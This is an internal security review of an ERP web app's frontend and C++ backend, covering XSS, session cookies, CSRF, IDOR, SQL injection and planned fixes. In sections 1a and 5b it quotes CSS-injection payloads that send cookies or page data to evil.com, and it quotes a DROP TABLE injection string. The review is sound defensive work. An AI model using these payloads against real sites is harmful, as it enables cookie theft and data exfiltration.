# Frontend Security Assessment — Review & Improvement Plan

**Source report date:** 2026-03-22
**Reviewed against:** current codebase (app.js, rpc.js, DLE)
**Status key:** 🔴 Action required · 🟡 Partially mitigated, improve · ✅ Irrelevant / already safe

---

## 1. Cross-Site Scripting (XSS)

### 1a. DLE Block Property CSS Injection 🔴

**Report claim:** `dleBlockHtml` performs string concatenation; if block properties contain `<script>` or event handlers they execute.

**Actual situation:** Property values (colors, font sizes, padding, etc.) are typed by the admin user in the props panel. They are interpolated directly into inline `style="..."` attributes with no sanitization. Example:

```js
if (p.color) s.push(`color:${p.color}`);
```

A malicious value like `red;background:url('https://evil.com/?c='+document.cookie)` in a color field would survive into the srcdoc iframe and could exfiltrate cookies or data.

**Planned fix:**
- Add a `sanitizePropValue(val, type)` helper that:
  - For `color` type: only pass values matching `/^#[0-9a-fA-F]{3,8}$|^rgb|^hsl|^[a-zA-Z]+$/`
  - For `number` type: parse as float, reject NaN
  - For `text`/`textarea`: HTML-escape `<`, `>`, `"`, `'`, `&`
  - For `select` type: whitelist against the known `options` array
- Call it in `dleStyleStr()` and `dleBlockHtml()` before any value is concatenated

---

### 1b. HTML Editor / Template Injection 🔴

**Report claim:** The HTML editor tab lets users input raw HTML. Without sanitization this is an XSS vector.

**Actual situation:** The HTML editor is a full raw-HTML editor by design (admin-only tool). The preview renders via `<iframe t-att-srcdoc="state.previewDoc">` **without** a `sandbox` attribute. Scripts inside the srcdoc run in the same origin. The popout uses `window.open + document.write` — same issue.

**Planned fixes:**
1. Add `sandbox="allow-same-origin allow-popups"` to the preview iframe. This blocks script execution while keeping CSS and layout intact.
2. For the saved template (used at print time by the backend), the backend should treat `template_html` as untrusted input and render it in a sandboxed Chromium context — already the case if WeasyPrint/Chromium headless is used.
3. The popout CodeMirror window is editor-only; no execution happens there — acceptable as-is.

---

### 1c. ChatterPanel Message Rendering ✅ IRRELEVANT

**Report claim:** ChatterPanel renders message bodies — ensure `t-esc` is used.

**Actual situation:** All message content in ChatterPanel uses `t-esc`, which OWL HTML-escapes before rendering. There is no `t-raw` usage in the chatter. If the backend sends pre-rendered HTML it will appear as escaped literal text, not executed. **No action needed.**

---

## 2. Authentication & Session Management

### 2a. Client-Side Auth Gate 🟡

**Report claim:** `state.authenticated` can be set to `true` in the browser console, bypassing the login screen.

**Actual situation:** This is true — `this.state.authenticated = true` in the console shows the UI. However, every data fetch goes through `RpcService.call()` which hits the C++ backend. The backend validates the session cookie on every request independently. There is no real data accessible without a valid server-side session.

**Assessment:** This is standard SPA architecture. The UI gate is cosmetic; the backend is the real enforcer. Low risk.

**Planned improvement (minor):** Document this explicitly in the backend API layer — every endpoint must return `403` for unauthenticated or unauthorized sessions, regardless of what the frontend sends.

---

### 2b. Session ID in Request Body 🟡

**Report claim:** Session tokens should be in `HttpOnly` + `Secure` cookies rather than LocalStorage.

**Actual situation:**
- `_session.sessionId` is stored in a JavaScript in-memory variable (inside the IIFE) — **not** in LocalStorage. Good.
- `credentials: 'include'` is used on all fetches, so the HTTP-only session cookie is sent automatically.
- However, `session_id` is **also** injected into the JSON request body as a fallback: `{ session_id: _session.sessionId }`. This means the session ID travels in the request body where it is visible to XSS attackers if they can read JS memory.

**Planned fix:**
1. If the backend cookie session is reliable (it is — `credentials: 'include'` is set), remove the `session_id` from the request body entirely. This eliminates the redundant copy.
2. Ensure the C++ backend sets `HttpOnly; Secure; SameSite=Strict` on the session cookie.
3. Remove `console.log('[rpc] call ... session_id in body: ...')` from `rpc.js` — this leaks the session ID to the browser console which is visible to extensions and DevTools users.

---

### 2c. CSRF Protection 🟡

**Report claim:** No CSRF token in POST headers.

**Actual situation:** All data-mutating requests use `Content-Type: application/json`. Browsers enforce CORS preflight for cross-origin JSON POSTs, and cannot forge them with plain HTML forms. This substantially mitigates CSRF without an explicit token.

**Assessment:** Mitigated by `Content-Type: application/json` + `credentials: include` combination. Full CSRF tokens would add defence-in-depth.

**Planned improvement:** The C++ backend should validate the `Origin` or `Referer` header on all state-mutating endpoints and reject requests from unexpected origins. This is a backend task.

---

## 3. Insecure Direct Object References (IDOR)

### 3a. Client-Supplied Model + ID 🟡

**Report claim:** `res_model` and `id` are sent from the frontend; attackers can modify them.

**Actual situation:** This is inherent to any client-driven data access pattern. The frontend sends `{ model: 'account.move', method: 'write', args: [[42], {...}] }`. An attacker with DevTools can change `42` to any ID.

**Assessment:** This is **entirely a backend responsibility**. The C++ ORM layer must enforce:
- Record-level access rules (ACL) per `uid`
- Model-level read/write/create/unlink permissions per group

**Planned improvement (backend task):** Audit the C++ `call_kw` handler to confirm it applies `ir.rule` domain restrictions and `ir.model.access` checks for every call. Document the audit result.

---

### 3b. Arbitrary Model String Accepted 🟡

**Report claim:** `RpcService.call` accepts arbitrary `res_model` strings; users could query sensitive system models.

**Actual situation:** The frontend does call arbitrary models (e.g., `ir.config.parameter`, `ir.report.template`). The backend must have model-level access controls.

**Assessment:** Backend concern. The frontend cannot meaningfully restrict this without creating a fragile allowlist that breaks on new modules.

**Planned improvement (backend task):** Ensure `ir.model.access.csv` entries are tightly scoped. Add an integration test that verifies `res.users` sensitive fields (e.g., `password`) are not exposed via `fields_get` / `search_read` to non-admin sessions.

---

## 4. Data Exposure

### 4a. Excessive Field Fetching in loadO2mData 🔴

**Report claim:** `loadO2mData` fetches all fields from child models; may pull in sensitive fields like cost prices or internal notes.

**Actual situation:** `ALWAYS_SKIP` currently excludes only: `id, create_date, write_date, company_id, currency_id, sequence, tax_ids, tax_ids_json`. Sensitive fields like `standard_price`, `margin`, `cost_price`, `internal_notes` could be fetched and loaded into browser memory.

**Planned fix:** Expand `ALWAYS_SKIP` to include known sensitive fields:
```js
const ALWAYS_SKIP = new Set([
    'id', 'create_date', 'write_date', 'create_uid', 'write_uid',
    'company_id', 'currency_id', 'sequence',
    'tax_ids', 'tax_ids_json',
    'standard_price', 'cost_price', 'margin', 'margin_percent',  // cost data
    'message_ids', 'message_follower_ids', 'activity_ids',       // chatter internals
    'password', 'password_crypt', 'api_key',                     // credentials
]);
```
Additionally, the backend `fields_get` response should already respect the logged-in user's field-level access — confirm this in the C++ implementation.

---

### 4b. Hardcoded Dummy Data ✅ IRRELEVANT

**Report claim:** `DLE_DUMMY` contains placeholder business names ("Higgs Invention", "Martin Wisecarver").

**Actual situation:** The current `DLE_DUMMY` uses fully generic placeholder values: "Demo Company Sdn. Bhd.", "ABC Technology Sdn. Bhd.", "INV/2025/0001", etc. None of these reference real internal naming conventions or sensitive data. **No action needed.**

---

### 4c. Global Scope Exposure of RpcService 🟡

**Report claim:** `owl` and `RpcService` are globally accessible; malicious scripts can make authenticated RPC calls.

**Actual situation:**
- `RpcService` is a global IIFE — any script (browser extension, injected ads, XSS payload) can call `RpcService.call('res.users', 'search_read', ...)` while the user is logged in.
- `owl` being global is harmless (it's a rendering library with no auth context).

**Planned improvement:**
1. This is largely mitigated by backend access controls (item 3a). The session cookie is HttpOnly so XSS can't steal it, but it CAN use it to make calls via `RpcService` if the page is compromised.
2. As a defence-in-depth measure, consider wrapping `RpcService` in a module (ES module `export`) rather than a global IIFE if/when a build step is added. In the current no-bundler setup, document this as an accepted risk.
3. Remove the `console.log` in `rpc.js` that prints session IDs (also mentioned in 2b).

---

## 5. Infrastructure & Configuration

### 5a. RPC Rate Limiting ✅ IRRELEVANT (frontend scope)

**Report claim:** `/rpc` endpoint should be rate-limited.

**Actual situation:** Rate limiting is a backend/nginx/infrastructure concern. The frontend has no mechanism to enforce this. **No frontend action needed.** The C++ HTTP server or a reverse proxy (nginx) should handle rate limiting.

---

### 5b. CSS Injection via User-Defined Styles 🔴

**Report claim:** User-defined styles in the Report Designer could allow `url()` imports for data exfiltration.

**Actual situation:** This overlaps with 1a. Block property values (especially `color`, `border_color`, `bg_color`) are injected into inline styles without validation. A value like:

```
#fff; background-image: url('https://evil.com/?d='+document.title)
```

would be emitted into the iframe's `style` attribute. CSS `url()` calls can leak data to external servers even without JavaScript.

**Planned fix:** Same as 1a — `sanitizePropValue()` on all property inputs before they reach `dleStyleStr()`. Additionally, add a `Content-Security-Policy` meta tag inside `DLE_CSS` (the embedded stylesheet in the generated template):

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; style-src 'unsafe-inline'; img-src 'self' data:; connect-src 'none';">
```

This blocks external `url()` loads in the preview iframe even if a malicious value slips through.

---

## 6. Backend Code Review — SQL Injection & Direct Server Harm

> This section was added after manual review of the C++ backend (`BaseModel.hpp`, `Domain.hpp`, `GenericViewModel.hpp`, `JsonRpcDispatcher.hpp`). It was not part of the original security report.

### 6a. SQL Injection via Domain/WHERE values ✅ SAFE

All user-supplied domain values go through `pqxx::params` with `$1`/`$2` placeholders — never string-concatenated. A payload like `'; DROP TABLE res_users--` is treated as a literal string by PostgreSQL.

### 6b. SQL Injection via field names in domain ✅ SAFE

`Domain.hpp sanitizeColumn_()` rejects any field name containing non-alphanumeric, non-underscore characters with a thrown exception. SQL metacharacters in field names are impossible.

### 6c. SQL Injection via column names in write()/read() ✅ SAFE

`write()` validates every incoming key with `fieldRegistry_.has(key)` before using it. Only fields registered at compile time in the model's `registerFields()` are accepted. Unknown keys are silently skipped.

### 6d. DDL injection (DROP TABLE, etc.) ✅ IMPOSSIBLE

The ORM has no DDL code paths at all. Only `SELECT`, `INSERT`, `UPDATE`, `DELETE` exist. `TABLE_NAME` is a `static constexpr` compile-time constant that cannot be influenced by any runtime input.

### 6e. ORDER BY injection — latent risk 🟡

**Location:** `BaseModel.hpp` lines 184, 211:
```cpp
if (!order.empty()) sql += " ORDER BY " + order;
```
This string is concatenated directly into SQL without parameterization. **Currently safe** because `GenericViewModel` always passes the hardcoded literal `"id ASC"` — never from user kwargs. However, if any future ViewModel passes `call.kwargs["order"]` here, it becomes a real SQL injection point.

**Planned fix:** Add an `ORDER BY` sanitizer before this path is ever opened up:
```cpp
static std::string sanitizeOrderBy(const std::string& order) {
    // Allow: "field_name ASC", "field_name DESC", "field1 ASC, field2 DESC"
    static const std::regex valid(R"(^[a-z_][a-z0-9_]*(\s+(ASC|DESC))?(\s*,\s*[a-z_][a-z0-9_]*(\s+(ASC|DESC))?)*$)",
                                   std::regex::icase);
    if (!std::regex_match(order, valid))
        throw std::runtime_error("Invalid ORDER BY expression");
    return order;
}
```

### 6f. Session cookie missing Secure flag 🔴

**Location:** `JsonRpcDispatcher.hpp` lines 189–194:
```cpp
drogon::Cookie c(SessionManager::cookieName(), cookieSid);
c.setHttpOnly(true);   // ✓ set
c.setSameSite(drogon::Cookie::SameSite::kLax);
// ← c.setSecure(true) is MISSING
```
`HttpOnly` is correctly set (JS cannot read the cookie). But without `Secure`, the cookie is transmitted over plain HTTP connections, exposing it to network interception. `SameSite=Lax` should also be upgraded to `Strict` for an internal ERP.

**Planned fix (backend):** Add `c.setSecure(true)` and change SameSite to `Strict`. Also enforce HTTPS at the nginx/reverse-proxy layer.

---

## Summary — Prioritised Action List

| Priority | Item | Location | Type |
|----------|------|----------|------|
| 🔴 High | Sanitize block property values before CSS injection | `dleStyleStr()`, `dleBlockHtml()` | Frontend |
| 🔴 High | Add `sandbox` attribute to preview iframe | DLE template | Frontend |
| 🔴 High | Add CSP meta tag inside `DLE_CSS` | `DLE_CSS` constant | Frontend |
| 🔴 High | Expand `ALWAYS_SKIP` with sensitive field names | `FormView.loadO2mData()` | Frontend |
| 🟡 Medium | Remove `session_id` from request body (rely on cookie only) | `rpc.js call()` | Frontend |
| 🟡 Medium | Remove `console.log` that prints session ID | `rpc.js` | Frontend |
| 🟡 Medium | Backend: add `ORDER BY` sanitizer before any user-supplied order is passed to model | `BaseModel.hpp` | Backend |
| 🟡 Medium | Backend: validate `Origin`/`Referer` on mutating endpoints | C++ HTTP layer | Backend |
| 🟡 Medium | Backend: confirm ACL + ir.rule applied on every `call_kw` | C++ ORM layer | Backend |
| 🔴 High | Backend: add `Secure` flag to session cookie | `JsonRpcDispatcher.hpp` line ~192 | Backend |
| 🟡 Medium | Backend: set `SameSite=Strict` on session cookie (currently Lax) | `JsonRpcDispatcher.hpp` | Backend |
| 🟡 Low | Wrap `RpcService` as ES module when build step is available | `rpc.js` | Frontend (future) |
| ✅ None | ChatterPanel `t-raw` XSS — already using `t-esc` | — | Not applicable |
| ✅ None | Hardcoded dummy data leaking sensitive names — dummy data is generic | — | Not applicable |
| ✅ None | RPC rate limiting — infrastructure/backend concern | — | Not applicable |
